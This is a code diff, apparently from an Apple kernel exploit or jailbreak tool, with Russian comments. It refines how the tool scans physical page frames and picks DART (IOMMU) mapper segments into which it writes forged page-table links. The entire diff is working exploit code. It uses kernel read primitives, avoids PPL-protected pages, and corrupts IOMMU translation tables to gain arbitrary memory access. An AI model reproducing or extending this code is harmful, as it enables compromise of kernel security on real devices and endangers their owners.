@@ -6276,12 +6276,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // проигрышных бутах лежал в типе вне {0x21,0x6,0xc} (лотерея типов
                 // фреймов). Табличные 0x8/0x9/0x13 census-безопасны; убийца
                 // (PPL-страница у края) ловится предсмертным логом фрейма.
-                if (!(t2 == 0x21 || t2 == 0x6 || t2 == 0xc || t2 == 0x8 || t2 == 0x9 || t2 == 0x13)) continue;
+                if (!(t2 == 0x21 || t2 == 0x6 || t2 == 0xc || t2 == 0x8 || t2 == 0x9 || t2 == 0x13 || t2 == 0x11)) continue;   // 1.9.218: + 0x11 (census видел; форма2-хранилище не найдено в остальных)
                 uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
                 uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
                 if (!kva || kpVAIsEL2Domain(kva)) continue;
                 kpNote(r, [NSString stringWithFormat:@"  [DEP] читаю фрейм %#llx t=%#x", (unsigned long long)pa, t2]);
-                if (t2 == 0x8 || t2 == 0x9 || t2 == 0x13) usleep(2000);   // предсмертная пауза только для табличных (убийца был среди них)
+                if (t2 == 0x8 || t2 == 0x9 || t2 == 0x13 || t2 == 0x11) usleep(2000);   // предсмертная пауза только для табличных (убийца был среди них)
                 uint8_t pbuf2[0x4000];
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
@@ -7803,35 +7803,37 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 *(uint64_t *)(L1p + (uint64_t)ig[1] * 8) = (L2PA >> 4) | 1;
                 *(uint64_t *)(L2p + (uint64_t)ig[2] * 8) = (L3PA >> 4) | 1;
                 *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = ctl2PA | linkFlags;
-                // 1.9.216: НАСТОЯЩИЕ корни — [mapper+0x170+i*8] (р.50: IODARTMapper
-                // держит per-seg структуры; +0x00 L0 embedded, +0x14 flags,
-                // bounds +0x18/+0x20/+0x28). Объекты [dartObj+0xcd0] — доменные
-                // дескрипторы (обе L0[0]=0, bounds 0 — не корни, 1.9.215 мимо).
-                // Приоритет: seg с bounds ∋ DVA; потом активная (q0-link валиден);
-                // потом dartObj-fallback как раньше.
+                // 1.9.218: валидация цели прививки — mseg = 0x21-объекты с vtable
+                // (low32 0x3ff1f9e8 у всех), НЕ таблицы: запись туда = коррупция
+                // (тихий ресет 1.9.217). Цель только если q0 = PA-link форма
+                // (не kernel-ptr) ИЛИ 0, И frame-type страницы ∈ {0x8,0x9,0x13}
+                // (настоящие таблицы DART — 0x21-объекты DART не читает вообще).
                 uint64_t segVA = 0, segOrig = 0;
                 for (uint32_t i = 0; i < 16; i++) {
                     uint64_t s = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)i * 8)) : 0;
                     if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
                     uint64_t q0 = early_kread64(s + 0x00);
-                    uint64_t f14 = early_kread64(s + 0x14);
-                    uint64_t b18 = early_kread64(s + 0x18), b20 = early_kread64(s + 0x20), b28 = early_kread64(s + 0x28);
+                    uint64_t q0u = kp_untag_ptr(q0);
                     uint64_t spa = kvtophys(s);
-                    BOOL inB = (dvaG >= b20 && dvaG < b28) || (dvaG >= b18 && dvaG < b20 && b20 > b18);
-                    kpNote(r, [NSString stringWithFormat:@"  [P7] mseg[%u]=%#llx PA=%#llx q0=%#018llx f14=%#x b18=%#llx b20=%#llx b28=%#llx%@",
-                              i, (unsigned long long)s, (unsigned long long)spa, (unsigned long long)q0, (uint32_t)f14,
-                              (unsigned long long)b18, (unsigned long long)b20, (unsigned long long)b28, inB ? @" ← DVA В BOUNDS" : @""]);
-                    if (!segVA && inB) { segVA = s; segOrig = q0; }
-                    else if (!segVA && q0 && ((q0 << 4) & 0x0000FFFFFFFFC000ULL) &&
-                             spa >= 0x10000000000ULL && spa < 0x10100000000ULL) { segVA = s; segOrig = q0; }
+                    int sft = spa ? kpFrameTypeOf(spa) : -1;
+                    BOOL tblOK = (sft == 0x8 || sft == 0x9 || sft == 0x13);
+                    BOOL linkOK = (q0 == 0) || (!kpLooksLikeKernelPointer(q0u) && ((q0 << 4) & 0x0000FFFFFFFFC000ULL));
+                    kpNote(r, [NSString stringWithFormat:@"  [P7] mseg[%u]=%#llx PA=%#llx тип=%#x q0=%#018llx — tbl=%d link=%d",
+                              i, (unsigned long long)s, (unsigned long long)spa, sft, (unsigned long long)q0, tblOK, linkOK]);
+                    if (!segVA && tblOK && linkOK) { segVA = s; segOrig = q0; }
                 }
-                if (!segVA) {   // fallback: dartObj-структуры (как 1.9.213/214/215)
+                if (!segVA) {   // fallback: dartObj-структуры с той же валидацией
                     for (uint32_t i = 0; i < 8 && !segVA; i++) {
                         uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
                         if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
-                        if (early_kread64(s + (uint64_t)ig[0] * 8) == 0) segVA = s;
+                        uint64_t q0 = early_kread64(s + 0x00);
+                        uint64_t spa = kvtophys(s);
+                        int sft = spa ? kpFrameTypeOf(spa) : -1;
+                        if (!(sft == 0x8 || sft == 0x9 || sft == 0x13)) continue;
+                        if (q0 == 0) { segVA = s; segOrig = 0; }
                     }
                 }
+                if (!segVA) kpNote(r, @"  [P7] валидной цели (таблица {8,9,13} + пустой/link слот) нет — прививка ОТМЕНЕНА, объекты не трогаем");
                 kpNote(r, [NSString stringWithFormat:@"  [P7] segVA=%#llx L0[%u] orig=%#018llx — прививка link=%#018llx",
                           (unsigned long long)segVA, ig[0], (unsigned long long)segOrig, (unsigned long long)((L1PA >> 4) | 1)]);
                 if (segVA) {
